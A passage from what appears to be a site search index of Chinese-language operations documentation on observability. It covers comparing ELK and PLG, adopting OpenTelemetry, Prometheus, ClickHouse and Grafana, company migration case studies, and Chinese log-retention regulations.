Versus PLG Stack</p> <p>The study found that PLG is more resource-efficient in terms of CPU and memory compared to ELK, and requires less disk space to store logs. ELK, however, performs better in terms of query request time. ELK has a more user-friendly interface and requires minimal configuration, while PLG requires more configuration but provides more control for experienced users.</p> <p>\u8fd9\u7bc7\u8bba\u6587\u9644\u5f55\u4e2d\u5c55\u793a\u4e86 ELK \u548c PLG \u7684\u4e00\u5957\u5b8c\u6574\u914d\u7f6e\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u8003\u3002</p> <p>\u6700\u7ec8\u6211\u4eec\u6ca1\u6709\u5b8c\u5168\u91c7\u7528 PLG \u6216 ELK \u65b9\u6848\u3002\u4ed6\u4eec\u5728\u81ea\u5df1\u64c5\u957f\u7684\u65b9\u9762\u786e\u5b9e\u505a\u7684\u5f88\u597d\uff0c\u4f46\u4ec5\u4ec5\u5982\u6b64\u3002\u5c31\u7b14\u8005\u4e2a\u4eba\u7684\u4f7f\u7528\u4f53\u9a8c\uff0cKibana \u5bf9\u6307\u6807\u6570\u636e\u7684\u5c55\u793a\u8fdc\u8fdc\u4e0d\u5982 Grafana\uff0c\u800c Loki \u7684\u65e5\u5fd7\u67e5\u8be2\u6bd4 Elasticsearch \u6b7b\u677f\u592a\u591a\u3002 Is ELK trustable also for metrics and alerting? : r/devops \u6709\u4e0d\u5c11\u76f8\u5173\u63a2\u8ba8\uff0c\u5927\u591a\u8ba4\u4e3a\u540c\u65f6\u91c7\u53d6 elk + prometheus \u662f\u597d\u7684\u9009\u62e9\uff0c\u800c\u5355\u72ec\u4f7f\u7528\u5176\u4e2d\u4e00\u4e2a\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\u53ef\u80fd\u4f1a\u6709\u4e0d\u8db3\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u6570\u636e\u91c7\u96c6\u5c42opentelemetry","title":"\u6570\u636e\u91c7\u96c6\u5c42\uff1aOpenTelemetry","text":"<p>Quote</p> <ul> <li> OpenTelemetry \u7b80\u4ecb</li> </ul> <p>OpenTelemetry \u7684\u5386\u53f2</p> <ul> <li>OpenTracing \u5236\u5b9a\u4e86\u4e00\u5957\u5e73\u53f0\u65e0\u5173\u3001\u5382\u5546\u65e0\u5173\u7684\u534f\u8bae\u6807\u51c6\uff0c\u4f7f\u5f97\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u65b9\u4fbf\u7684\u6dfb\u52a0\u6216\u66f4\u6362\u5e95\u5c42 APM \u7684\u5b9e\u73b0\u30022016 \u5e74 11 \u6708 CNCF.io \u63a5\u53d7 OpenTracing\uff0c\u540c\u65f6\u8fd9\u4e5f\u662f CNCF \u7684\u7b2c\u4e09\u4e2a\u9879\u76ee\uff0c\u524d\u4e24\u4e2a\u662f\u9f0e\u9f0e\u5927\u540d\u7684 Kubernetes \u548c Prometheus\uff0c\u7531\u6b64\u53ef\u89c1\u5f00\u6e90\u4e16\u754c\u5bf9 APM \u7684\u91cd\u89c6\uff0c\u5bf9\u7edf\u4e00\u6807\u51c6\u7684\u91cd\u89c6\u548c\u6e34\u671b\u3002</li> <li>OpenCensus \u7531\u8c37\u6b4c\u63a8\u51fa\uff0c\u6700\u521d\u76ee\u6807\u5e76\u4e0d\u662f\u62a2 OpenTracing \u7684\u996d\u7897\uff0c\u800c\u662f\u4e3a\u4e86\u628a Go \u8bed\u8a00\u7684 Metrics \u91c7\u96c6\u3001\u94fe\u8def\u8ddf\u8e2a\u4e0e Go \u8bed\u8a00\u81ea\u5e26\u7684 profile \u5de5\u5177\u6253\u901a\uff0c\u7edf\u4e00\u7528\u6237\u7684\u4f7f\u7528\u65b9\u5f0f\u3002\u968f\u7740\u9879\u76ee\u7684\u8fdb\u5c55\uff0c\u91ce\u5fc3\u4e5f\u81a8\u80c0\u4e86\uff0c\u8fd9\u4e2a\u65f6\u5019\u5f00\u59cb\u5e7b\u60f3\u4e3a\u4ec0\u4e48\u4e0d\u628a\u5176\u5b83\u5404\u79cd\u8bed\u8a00\u7684\u76f8\u5173\u91c7\u96c6\u90fd\u7edf\u4e00\u5462\uff1fOpenCensus \u7684\u573a\u666f\u8fdb\u4e00\u6b65\u6269\u5927\u4e86\uff0c\u4e0d\u4ec5\u505a\u4e86 Metrics \u57fa\u7840\u6307\u6807\u76d1\u63a7\uff0c\u8fd8\u505a\u4e86 OpenTracing \u7684\u8001\u672c\u884c\uff1a\u5206\u5e03\u5f0f\u8ddf\u8e2a\u3002\u6b64\u5916\uff0c\u5fae\u8f6f\u4e5f\u52a0\u5165\u4e86 OpenCensus\u3002</li> <li>OpenTracing \u548c OpenCensus \u7684\u529f\u80fd\u7279\u6027\u5404\u6709\u4f18\u7f3a\u70b9\uff0c\u793e\u533a\u6d3b\u8dc3\u5ea6\u534a\u65a4\u516b\u4e24\u3002\u4e00\u8fb9\u662f\u5f00\u6e90\u793e\u533a\u7684\u529b\u91cf\uff0c\u4e00\u8fb9\u662f\u8c37\u6b4c\u3001\u5fae\u8f6f\u3002\u8fd9\u4e24\u4e2a\u9879\u76ee\u968f\u540e\u5408\u5e76\uff0c\u8bde\u751f\u4e86 OpenTelemetry\u3002</li> </ul> <p>OpenTelemetry \u662f\u4e00\u4e2a\u53ef\u89c2\u6d4b\u6027\u6846\u67b6\u548c\u5de5\u5177\uff0c\u6db5\u76d6\u4e86\u53ef\u89c2\u6d4b\u6027\u7684\u4e09\u5927\u652f\u67f1\u3002\u4e0b\u9762\u5de6\u56fe\u5c55\u793a\u4e86\u4f20\u7edf\u7684\u53ef\u89c2\u6d4b\u6027\u4f53\u7cfb\uff0c\u4e09\u5927\u652f\u67f1\u5404\u81ea\u72ec\u7acb\uff0c\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u6570\u636e\u6536\u96c6\u3001\u5b58\u50a8\u3001\u67e5\u8be2\u548c\u5c55\u793a\u3002\u53f3\u56fe\u5c55\u793a\u4e86 OpenTelemetry \u7684\u67b6\u6784\u3002</p> <p></p> <p></p> \u4f20\u7edf\u4e0e OpenTelemetry \u67b6\u6784\u5bf9\u6bd4      OpenTelemetry Logging - OpenTelemetry      <p>OpenTelemetry \u7684\u7ec8\u6781\u76ee\u6807\uff1a\u5b9e\u73b0 Metrics\u3001Tracing\u3001Logging \u7684\u878d\u5408\u53ca\u5927\u4e00\u7edf\uff0c\u4f5c\u4e3a\u53ef\u89c2\u6d4b\u6027\u7684\u6570\u636e\u91c7\u96c6\u7ec8\u6781\u89e3\u51b3\u65b9\u6848\u3002</p> <ul> <li>\u57fa\u4e8e Metrics \u544a\u8b66\u53d1\u73b0\u5f02\u5e38</li> <li>\u901a\u8fc7 Tracing \u5b9a\u4f4d\u5230\u5177\u4f53\u7684\u7cfb\u7edf\u548c\u65b9\u6cd5</li> <li>\u6839\u636e\u6a21\u5757\u7684\u65e5\u5fd7\u6700\u7ec8\u5b9a\u4f4d\u5230\u9519\u8bef\u8be6\u60c5\u548c\u6839\u6e90</li> <li>\u8c03\u6574 Metrics \u7b49\u8bbe\u7f6e\uff0c\u66f4\u7cbe\u786e\u7684\u544a\u8b66/\u53d1\u73b0\u95ee\u9898</li> </ul> <p>\u4e3a\u4e86\u5b9e\u73b0\u878d\u5408\uff0cOpenTelemetry \u63d0\u51fa\u4e86\u4e0a\u4e0b\u6587\uff08Context\uff09\u7684\u6982\u5ff5\u3002Context \u4e3a Metrics\u3001Logging\u3001Tracing \u63d0\u4f9b\u7edf\u4e00\u7684\u4e0a\u4e0b\u6587\uff0c\u4e09\u8005\u5747\u53ef\u4ee5\u8bbf\u95ee\u5230\u8fd9\u4e9b\u4fe1\u606f\uff0c\u540c\u65f6 Context \u53ef\u4ee5\u968f\u7740\u8bf7\u6c42\u94fe\u8def\u7684\u6df1\u5165\uff0c\u4e0d\u65ad\u5f80\u4e0b\u4f20\u64ad\u3002</p> <p>OpenTelemetry \u7684\u81ea\u8eab\u5b9a\u4f4d\u5f88\u660e\u786e\uff1a\u6570\u636e\u91c7\u96c6\u548c\u6807\u51c6\u89c4\u8303\u7684\u7edf\u4e00\uff0c\u5bf9\u4e8e\u6570\u636e\u5982\u4f55\u53bb\u4f7f\u7528\u3001\u5b58\u50a8\u3001\u5c55\u793a\u3001\u544a\u8b66\uff0c\u5b98\u65b9\u662f\u4e0d\u6d89\u53ca\u7684\u3002</p> <p>OpenTelemetry \u6b63\u5728\u9010\u6b65\u6210\u4e3a\u53ef\u89c2\u6d4b\u6027\u9886\u57df\u7684\u6807\u51c6\u89c4\u8303\u3002\u5e76\u4e14\uff0cOpenTelemetry \u7684\u5b9e\u73b0\u5927\u591a\u91c7\u7528 Go\uff0c\u4e0e\u6211\u4eec\u7684\u6280\u672f\u6808\u76f8\u7b26\u3002\u7efc\u5408\u4ee5\u4e0a\u539f\u56e0\uff0c\u6211\u4eec\u6700\u7ec8\u9009\u62e9\u4e86 OpenTelemetry \u4f5c\u4e3a\u6570\u636e\u91c7\u96c6\u5c42\u7684\u6807\u51c6\uff0c\u5e76\u5c06\u5176\u5e94\u7528\u5230\u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684\u5404\u7c7b\u5de5\u5177\u4e2d\u3002</p> <p>\u6848\u4f8b\u8c03\u7814</p> <p>\u8d8a\u6765\u8d8a\u591a\u7684\u516c\u53f8\u8fc1\u79fb\u5230 OpenTelemetry\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e9b\u53c2\u8003\uff1a</p> <ul> <li> <p>Why and How eBay Pivoted to OpenTelemetry - ebay\uff1aebya \u4e8e 2022 \u5e74\u5c06 K8s \u4e0a\u7684 MetricBeat \u8fc1\u79fb\u5230 OpenTelemetry\uff0c\u540c\u65f6\u79ef\u6781\u8d21\u732e\u5230 OpenTelemetry \u793e\u533a\u3002\u4ed6\u4eec\u8ba4\u4e3a OpenTelemetry \u7684\u53ef\u4f38\u7f29\u6027\u548c\u6027\u80fd\u90fd\u6709\u4f18\u52bf\uff1a</p> <p>We are busy working on doing the same for Filebeat at this point and early performance benchmarks are very promising.</p> <p>We will continue to learn from running agents at scale and keep pivoting as needed. We will continue to work with the OpenTelemetry community as it continues to pave the way for standardization within the Observability ecosystem. Now that we\u2019re using OpenTelemetry, we can provide our developers with an industry-approved open standard to send telemetry into Sherlock.io. As the community grows to offer support for newer features like profiling, we will adopt them into the platform to benefit our developer community.</p> </li> <li> <p> \u53ef\u89c2\u6d4b\u6027\u6280\u672f\u751f\u6001\u548c OpenTelemetry \u539f\u7406\u53ca\u5b9e\u8df5 - \u817e\u8baf\u4e91\uff1a\u817e\u8baf\u4e8e 2021 \u5e74\u505a\u7684\u6280\u672f\u62a5\u544a\u3002\u6b64\u65f6\u817e\u8baf OpenTelemetry OTeam \u5df2\u7ecf\u5728\u5185\u90e8\u57fa\u4e8e OpenTelemetry \u5efa\u7acb\u8d77\u4e86\u5b8c\u5584\u7684\u4e1a\u52a1\u548c\u5e73\u53f0\u76d1\u6d4b\u4f53\u7cfb\u201c\u5929\u673a\u9601 2.0\u201d\uff0c\u4e3a\u5185\u90e8\u4e1a\u52a1\u63d0\u4f9b\u4e86\u5168\u94fe\u8def\u53ef\u89c2\u6d4b\u6027\u652f\u6301\u3002</p> </li> <li> <p> B \u7ad9\u57fa\u4e8e Clickhouse \u7684\u4e0b\u4e00\u4ee3\u65e5\u5fd7\u4f53\u7cfb\u5efa\u8bbe\u5b9e\u8df5\uff1a2022 \u5e74 B \u7ad9\u65e5\u5fd7\u7cfb\u7edf\u4ece Elasticsearch \u8fc1\u79fb\u5230 OpenTelemetry + ClickHouse\u3002</p> <p>\u65e5\u5fd7\u4f5c\u4e3a\u4e00\u79cd\u5e94\u7528\u4ea7\u751f\u7684\u5b9e\u65f6\u6570\u636e\uff0c\u968f\u7740\u4e1a\u52a1\u5e94\u7528\u89c4\u6a21\u53d1\u5c55\u800c\u7d27\u8ddf\u7740\u6269\u5927\u3002\u65e5\u5fd7\u7cfb\u7edf\u5fc5\u987b\u5728\u5177\u5907\u9ad8\u541e\u5410\u91cf\u7684\u540c\u65f6\uff0c\u4e5f\u8981\u5177\u5907\u8f83\u9ad8\u7684\u5b9e\u65f6\u6027\u8981\u6c42\u3002Elasticsearch \u7531\u4e8e\u5206\u8bcd\u7b49\u7279\u6027\uff0c\u5728\u5199\u541e\u5410\u91cf\u4e0a\u6709\u7740\u660e\u663e\u7684\u74f6\u9888\uff0c\u5206\u8bcd\u8017 CPU \u4e14\u96be\u4ee5\u89e3\u51b3\u70ed\u70b9\u95ee\u9898\u3002\u5982\u679c\u8d44\u6e90\u5197\u4f59\u4e0d\u8db3\uff0c\u5c31\u5bb9\u6613\u5bfc\u81f4\u7a33\u5b9a\u6027\u4e0b\u964d\uff0c\u65e5\u5fd7\u6444\u5165\u53d1\u751f\u5ef6\u8fdf\uff0c\u65e5\u5fd7\u7684\u5ef6\u8fdf\u4f1a\u5bf9\u6392\u969c\u4ea7\u751f\u6781\u5927\u8d1f\u9762\u5f71\u54cd\u3002</p> <p>Kibana \u867d\u7136\u597d\u7528\uff0c\u4f46\u4e5f\u4e0d\u662f\u6ca1\u6709\u7f3a\u70b9\u7684\uff0c\u6574\u4f53\u4ee3\u7801\u590d\u6742\uff0c\u4e8c\u6b21\u5f00\u53d1\u56f0\u96be\u3002\u4e14\u6bcf\u6b21\u5347\u7ea7 ES \u5fc5\u987b\u5347\u7ea7\u5230\u5bf9\u5e94\u7684 Kibana \u7248\u672c\u4e5f\u589e\u52a0\u4e86\u7528\u6237\u8fc1\u79fb\u7684\u6210\u672c\u3002\u8fd8\u6709\u4e00\u70b9\u5c31\u662f Kibana Query \u867d\u7136\u8bed\u6cd5\u8f83\u4e3a\u7b80\u5355\uff0c\u4f46\u5bf9\u4e8e\u521d\u6b21\u63a5\u89e6\u7684\u7814\u53d1\u8fd8\u662f\u6709\u4e00\u5b9a\u7684\u5b66\u4e60\u6210\u672c\u7684\u3002</p> <p>\u5728\u91c7\u96c6\u548c\u4f20\u8f93\u4e0a\uff0c\u6211\u4eec\u5236\u5b9a\u4e86\u4e00\u5957\u5185\u90e8\u7684\u65e5\u5fd7\u683c\u5f0f\u89c4\u8303\uff0c\u4f7f\u7528 JSON \u4f5c\u4e3a\u4f20\u8f93\u683c\u5f0f\uff0c\u5e76\u63d0\u4f9b\u4e86 Java \u548c Golang \u7684 SDK\u3002\u8fd9\u5957\u4f20\u8f93\u683c\u5f0f\u672c\u8eab\u5728\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u4e0a\u6027\u80fd\u4e00\u822c\uff0c\u4e14\u79c1\u6709\u534f\u8bae\u96be\u4ee5\u907f\u514d\u517c\u5bb9\u6027\u548c\u53ef\u7ef4\u62a4\u6027\u95ee\u9898\u3002</p> <p>\u9488\u5bf9\u4e0a\u8ff0\u7684\u4e00\u7cfb\u5217\u95ee\u9898\uff0c\u6211\u4eec\u8bbe\u8ba1\u4e86 Bilibili \u65e5\u5fd7\u670d\u52a1 2.0 \u7684\u4f53\u7cfb\uff0c\u4e3b\u8981\u7684\u8fdb\u5316\u4e3a\u4f7f\u7528 ClickHouse \u4f5c\u4e3a\u5b58\u50a8\uff0c\u5b9e\u73b0\u4e86\u81ea\u7814\u7684\u65e5\u5fd7\u53ef\u89c6\u5316\u5206\u6790\u5e73\u53f0\uff0c\u5e76\u4f7f\u7528 OpenTelemetry \u4f5c\u4e3a\u7edf\u4e00\u65e5\u5fd7\u4e0a\u62a5\u534f\u8bae\u3002</p> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u6570\u636e\u5b58\u50a8\u5c42prometheus-\u548c-clickhouse","title":"\u6570\u636e\u5b58\u50a8\u5c42\uff1aPrometheus \u548c ClickHouse","text":"<p>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 OpenTelemetry \u53ea\u8d1f\u8d23\u6570\u636e\u751f\u4ea7\u548c\u6536\u96c6\u3002\u81f3\u4e8e\u5b58\u50a8\u3001\u4f7f\u7528\u548c\u5206\u6790\uff0c\u6211\u4eec\u9700\u8981\u7ee7\u7eed\u505a\u9009\u62e9\u3002</p> <ul> <li>\u6307\u6807\u6570\u636e\uff1aPrometheus \u548c InfluxDB \u4e24\u4e2a TSDB \u4f5c\u4e3a\u5019\u9009\u8005\u3002Prometheus \u7531\u4e8e\u4ee5\u4e0b\u539f\u56e0\u80dc\u51fa\uff1a<ul> <li>Prometheus\u201c\u81f4\u529b\u4e8e\u6210\u4e3a OpenTelemetry Metrics \u7684\u9ed8\u8ba4\u5b58\u50a8\u201d\u3002\u5728\u5373\u5c06\u5230\u6765\u7684 Prometheus 3.0\uff0cOTEL \u5c06\u5f97\u5230\u539f\u751f\u652f\u6301\u3002</li> <li>\u5b83\u4e0d\u4ec5\u4ec5\u662f\u6570\u636e\u5e93\uff0c\u8fd8\u662f\u4e00\u5957\u76d1\u63a7\u7cfb\u7edf\uff0c\u81ea\u5e26\u4e86\u5206\u6790\u529f\u80fd\uff0c\u4e3a\u4e0b\u4e00\u5c42\u63d0\u4f9b\u4fbf\u5229\u3002</li> </ul> </li> <li>\u65e5\u5fd7\u6570\u636e\uff1aElasticsearch \u548c ClickHouse \u662f\u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u5e93\uff0c\u751f\u6001\u4e5f\u5404\u6709\u4f18\u7565\u3002\u76ee\u524d\u90fd\u90e8\u7f72\u4e00\u5957\u8bd5\u8bd5\u770b\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u67e5\u8be2\u548c\u5206\u6790\u5c42grafana","title":"\u67e5\u8be2\u548c\u5206\u6790\u5c42\uff1aGrafana","text":"<p>\u6211\u4eec\u9009\u62e9 Grafana\u3002\u5b83\u8db3\u591f\u7075\u6d3b\uff0c\u652f\u6301\u591a\u79cd\u6570\u636e\u6e90\uff0c\u800c\u4e14\u6709\u4e30\u5bcc\u7684\u63d2\u4ef6\u548c\u6a21\u677f\uff0c\u53ef\u4ee5\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\uff0c\u4e0d\u8bba\u662f metric\u3001log \u8fd8\u662f trace\u3002</p> <p>\u6b64\u5916\uff0c\u5927\u6570\u636e\u6316\u6398\u9886\u57df\u5e94\u8be5\u5c11\u4e0d\u4e86 AI \u7684\u8eab\u5f71\u3002MindsDB \u662f\u4e00\u4e2a\u5f00\u6e90\u865a\u62df\u6570\u636e\u5e93\uff0c\u53ef\u5b9e\u73b0\u5c06\u5b9e\u65f6\u6570\u636e\u8fde\u63a5\u5230\u4eba\u5de5\u667a\u80fd\u7cfb\u7edf\u7684\u7ba1\u9053\u81ea\u52a8\u5316\u3002\u4f7f\u7528 AI \u8fdb\u884c\u6570\u636e\u5206\u6790\u6709\u5f85\u8fdb\u4e00\u6b65\u7814\u7a76\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"<p>\u6211\u4eec\u4e5f\u8c03\u67e5\u8fc7\u5176\u4ed6\u4ea7\u54c1\uff0c\u4f46\u6700\u7ec8\u6ca1\u6709\u9009\u62e9\u7684\u539f\u56e0\uff1a</p> <ul> <li> <p>Fluentd: \u65e5\u5fd7\u6536\u96c6\u5de5\u5177\uff0c\u652f\u6301\u591a\u79cd\u6570\u636e\u6e90\u548c\u8f93\u51fa\u3002\u4f7f\u7528 Golang \u5199\u4e00\u4e2a\u53d6\u4ee3 fluentd \u7684\u65e5\u5fd7\u5904\u7406\u5668 \u8fd9\u7bc7\u535a\u5ba2\u5bf9\u5b83\u505a\u4e86\u4e00\u4e9b\u8bc4\u8bba\uff1a</p> <p>\u6211\u66fe\u7ecf\u5199\u8fc7\u4e00\u7bc7\u4ecb\u7ecd fluentd \u7684\u6587\u7ae0\uff1afluentd \u5b89\u88c5\u3001\u914d\u7f6e\u3001\u4f7f\u7528\u4ecb\u7ecd\u3002\u5728\u6b64\u6587\u4e2d\uff0c\u6211\u4ecb\u7ecd\u4e86\u4f7f\u7528 fluentd \u4f5c\u4e3a\u65e5\u5fd7\u5904\u7406\u5de5\u5177\u7684\u7528\u6cd5\uff0c\u5728\u5de5\u4f5c\u4e2d\uff0c\u6211\u4e5f\u4f7f\u7528\u4e86\u591a\u5e74\u7684 fluentd\u3002\u800c\u4e14 fluentd \u8fd8\u52a0\u5165\u4e86 CNCF\uff0c\u53d1\u5c55\u6f5c\u529b\u53ef\u89c2\u3002</p> <p>\u4e0d\u8fc7\u5728\u76ee\u524d\u7684\u516c\u53f8\u4e2d\uff0c\u56e0\u4e3a\u8f83\u4e3a\u7279\u6b8a\u7684\u9700\u6c42\uff0c\u4f7f\u7528 fluentd \u9047\u5230\u4e86\u4e00\u4e9b\u95ee\u9898\u3002\u9996\u5148\u662f\u63d2\u4ef6\u8d28\u91cf\u826f\u83a0\u4e0d\u9f50\uff0c\u800c\u56e0\u4e3a\u6ca1\u6709\u719f\u6089 ruby \u7684\u4eba\uff0c\u6240\u4ee5\u8c03\u8bd5\u8d77\u6765\u76f8\u5f53\u5934\u75bc\u3002\u5176\u6b21\u662f ruby \u5b58\u5728 GIL\uff0c\u6027\u80fd\u88ab\u9650\u5236\u5728\u5355\u6838\u4e0a\uff0c\u800c process \u6269\u5c55\u7684\u53ef\u7528\u573a\u666f\u6709\u9650\u3002\u6700\u540e\u5c31\u662f\u5b9e\u9645\u9700\u6c42\u8fc7\u4e8e\u591a\u6837\uff0cfluentd \u7684\u5f88\u591a\u63d2\u4ef6\u6ca1\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u6216\u662f\u9700\u8981\u5927\u91cf\u4f7f\u7528 rewrite \u63a7\u5236\u89e3\u6790\u6d41\uff0c\u914d\u7f6e\u6587\u4ef6\u76f8\u5f53\u6666\u6da9\u96be\u61c2\u3002\u7efc\u5408\u8fd9\u4e9b\u539f\u56e0\uff0c\u6b63\u597d\u6700\u8fd1\u6ca1\u4ec0\u4e48\u4e8b\uff0c\u4ee5\u53ca\u4e5f\u60f3\u770b\u770b golang \u7684\u80fd\u529b\uff0c\u6240\u4ee5\u5e72\u8106\u51b3\u5b9a\u7528 golang \u81ea\u5df1\u5199\u4e00\u4e2a\u3002</p> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u5199\u5728\u6700\u540e\u6211\u4eec\u624d\u521a\u521a\u5f00\u59cb","title":"\u5199\u5728\u6700\u540e\uff1a\u6211\u4eec\u624d\u521a\u521a\u5f00\u59cb","text":"<p> Can OpenTelemetry Collector replace Filebeat and Metricbeat</p> <p>My final thought on opentelemetry to have 1 fits-all-solution: No, it is currently not possible and you probably do not need it. OTEL sdks is still partially in not very mature state, your microservices are also different and requiring different integrations and having different deployment procedures. What I can propose here is to try this and that, fail, write down your observations, fail again and again to have more mature understanding of what you more or less need. So, be able to instrument your systems with different tools and keep your hand on pulse of the whole Observability news - it's road only started ;)</p> <p>\u7b14\u8005\u5341\u5206\u8ba4\u540c\u4e0a\u9762\u8fd9\u6bb5\u8bdd\u3002\u6211\u4eec\u7684\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u8bbe\u8ba1\u53ea\u662f\u4e00\u4e2a\u521d\u6b65\u7684\u5c1d\u8bd5\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e0d\u65ad\u5730\u5b9e\u8df5\u3001\u5931\u8d25\u3001\u603b\u7ed3\uff0c\u624d\u80fd\u627e\u5230\u6700\u9002\u5408\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/","title":"\u65e5\u5fd7\u6536\u96c6","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u65e5\u5fd7\u6536\u96c6","title":"\u65e5\u5fd7\u6536\u96c6","text":"<p>\u672c\u6587\u6d89\u53ca\u65e5\u5fd7\u683c\u5f0f\u3001OpenTelemetry \u65e5\u5fd7\u91c7\u96c6\u4e0e\u5904\u7406\u3001ClickHouse \u65e5\u5fd7\u5b58\u50a8\u7b49\u5185\u5bb9\u3002</p> <p>\u5728\u9605\u8bfb\u672c\u6587\u524d\uff0c\u8bf7\u5148\u9605\u8bfb OpenTelemetry\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u65e5\u5fd7\u5408\u89c4","title":"\u65e5\u5fd7\u5408\u89c4","text":"<p>\u6d59\u6c5f\u5927\u5b66\u7f51\u7edc\u4e0e\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u529e\u6cd5\uff082017 \u5e74\uff09</p> <p>\u7b2c\u4e94\u6761 \u4fe1\u606f\u6280\u672f\u4e2d\u5fc3\u8d1f\u8d23\u5b66\u6821\u7f51\u7edc\u4e0e\u4fe1\u606f\u7cfb\u7edf\u7684\u65e5\u5e38\u7ba1\u7406\u548c\u7ef4\u62a4\uff0c\u4fdd\u969c\u7f51\u7edc\u4e0e\u4fe1\u606f\u7cfb\u7edf\u7684\u6b63\u5e38\u8fd0\u884c\uff1b\u4fdd\u5b58\u7f51\u7edc\u8fd0\u884c\u65e5\u5fd7\uff0c\u914d\u5408\u8c03\u67e5\u53d6\u8bc1\uff1b\u8d1f\u8d23\u5165\u7f51\u5355\u4f4d\u548c\u4e2a\u4eba\u529e\u7406\u5165\u7f51\u767b\u8bb0\u624b\u7eed\uff0c\u7b7e\u7f72\u76f8\u5e94\u7684\u5b89\u5168\u8d23\u4efb\u4e66\u3002</p> <p>\u7b2c\u4e8c\u5341\u4e09\u6761 \u5404\u5355\u4f4d\u5bf9\u4e8e\u4e3b\u529e\u7684\u4fe1\u606f\u7cfb\u7edf\uff0c\u6bcf\u5b63\u5ea6\u81f3\u5c11\u8fdb\u884c 1 \u6b21\u5b89\u5168\u68c0\u67e5\uff0c\u586b\u5199\u68c0\u67e5\u53f0\u8d26\uff08\u8be6\u89c1\u9644\u4ef6\uff09\u3002\u68c0\u67e5\u5185\u5bb9\u5305\u62ec\uff1a</p> <ul> <li>\uff08\u4e03\uff09\u68c0\u67e5\u7cfb\u7edf\u65e5\u5fd7\u7559\u5b58\u60c5\u51b5\uff0c\u7559\u5b58\u76f8\u5173\u65e5\u5fd7\u4e0d\u5c11\u4e8e\u516d\u4e2a\u6708\u3002</li> </ul> <p>\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u56fd\u52a1\u9662\u4ee4\uff08\u7b2c 292 \u53f7\uff09\u4e92\u8054\u7f51\u4fe1\u606f\u670d\u52a1\u7ba1\u7406\u529e\u6cd5</p> <p>\u7b2c\u5341\u56db\u6761 \u4ece\u4e8b\u65b0\u95fb\u3001\u51fa\u7248\u4ee5\u53ca\u7535\u5b50\u516c\u544a\u7b49\u670d\u52a1\u9879\u76ee\u7684\u4e92\u8054\u7f51\u4fe1\u606f\u670d\u52a1\u63d0\u4f9b\u8005\uff0c\u5e94\u5f53\u8bb0\u5f55\u63d0\u4f9b\u7684\u4fe1\u606f\u5185\u5bb9\u53ca\u5176\u53d1\u5e03\u65f6\u95f4\u3001\u4e92\u8054\u7f51\u5730\u5740\u6216\u8005\u57df\u540d\uff1b\u4e92\u8054\u7f51\u63a5\u5165\u670d\u52a1\u63d0\u4f9b\u8005\u5e94\u5f53\u8bb0\u5f55\u4e0a\u7f51\u7528\u6237\u7684\u4e0a\u7f51\u65f6\u95f4\u3001\u7528\u6237\u5e10\u53f7\u3001\u4e92\u8054\u7f51\u5730\u5740\u6216\u8005\u57df\u540d\u3001\u4e3b\u53eb\u7535\u8bdd\u53f7\u7801\u7b49\u4fe1\u606f\u3002\u4e92\u8054\u7f51\u4fe1\u606f\u670d\u52a1\u63d0\u4f9b\u8005\u548c\u4e92\u8054\u7f51\u63a5\u5165\u670d\u52a1\u63d0\u4f9b\u8005\u7684\u8bb0\u5f55\u5907\u4efd\u5e94\u5f53\u4fdd\u5b58 60 \u65e5\uff0c\u5e76\u5728\u56fd\u5bb6\u6709\u5173\u673a\u5173\u4f9d\u6cd5\u67e5\u8be2\u65f6\uff0c\u4e88\u4ee5\u63d0\u4f9b\u3002</p> <p>\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u516c\u5b89\u90e8\u4ee4\uff08\u7b2c 82 \u53f7\uff09\u4e92\u8054\u7f51\u5b89\u5168\u4fdd\u62a4\u6280\u672f\u63aa\u65bd\u89c4\u5b9a</p> <p>\u7b2c\u5341\u4e09\u6761 \u4e92\u8054\u7f51\u670d\u52a1\u63d0\u4f9b\u8005\u548c\u8054\u7f51\u4f7f\u7528\u5355\u4f4d\u4f9d\u7167\u672c\u89c4\u5b9a\u843d\u5b9e\u7684\u8bb0\u5f55\u7559\u5b58\u6280\u672f\u63aa\u65bd\uff0c\u5e94\u5f53\u5177\u6709\u81f3\u5c11\u4fdd\u5b58\u516d\u5341\u5929\u8bb0\u5f55\u5907\u4efd\u7684\u529f\u80fd\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u65e5\u5fd7\u901a\u7528\u77e5\u8bc6\u548c\u6280\u80fd","title":"\u65e5\u5fd7\u901a\u7528\u77e5\u8bc6\u548c\u6280\u80fd","text":"<p>\u5982 Unified Logging Layer: Turning Data into Action - Fluentd \u6240\u8bf4\uff1a</p> <p>In the last 10 years, the primary consumer of log data shifted from humans to machines.</p> <p>Software engineers still read logs, especially when their software behaves in an unexpected manner. However, in terms of \"bytes processed\", humans account for a tiny fraction of the total consumption. Machines, not humans, are crunching log data day and night to generate reports and run statistical calculations to help us make decisions. The insights derived from log data used to be post hoc, pull and episodic. Today, it is ad hoc, push and statistical.</p> <p>Undoubtedly, Moore's Law and the advances in distributed systems design have made large-scale log processing and data mining accessible. However, many organizations, even with abundant financial and human 